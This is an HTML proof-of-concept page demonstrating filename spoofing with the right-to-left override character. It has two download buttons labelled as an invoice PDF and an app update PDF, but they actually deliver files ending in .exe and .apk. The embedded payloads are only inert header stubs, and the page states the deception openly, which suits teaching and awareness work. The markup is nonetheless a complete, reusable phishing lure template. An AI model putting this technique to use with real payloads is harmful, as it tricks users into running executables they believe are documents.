<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Filename Spoofing PoC</title>
    <style>
        body { font-family: sans-serif; text-align: center; margin-top: 50px; line-height: 1.6; }
        .download-btn {
            display: inline-block;
            margin: 10px;
            padding: 15px 25px;
            background-color: #007bff;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
        }
        .warning { margin-top: 30px; color: red; font-weight: bold; }
    </style>
</head>
<body>

    <h2>Filename Spoofing via RLO (U+202E)</h2>
    <p>
        Clicking the links below will visually appear to download a <b>.pdf</b> file,<br> 
        but they are actually <b>.exe</b> and <b>.apk</b> files.
    </p>

    <br>

    <!-- Example 1: .exe spoofed as .pdf -->
    <a href="data:application/octet-stream;base64,TVpQAA==" 
       download="Invoice_2024&#x202E;fdp.exe" 
       class="download-btn">
       Download Invoice (PDF)
    </a>

    <br>

    <!-- Example 2: .apk spoofed as .pdf -->
    <!-- Note: 'fdp.kpa' reversed becomes 'apk.pdf' -->
    <a href="data:application/vnd.android.package-archive;base64,UEsDBBQAAAAIAAAAIQAAAAA=" 
       download="Software_Update&#x202E;fdp.kpa" 
       class="download-btn">
       Download App Update (PDF)
    </a>


</body>
</html>
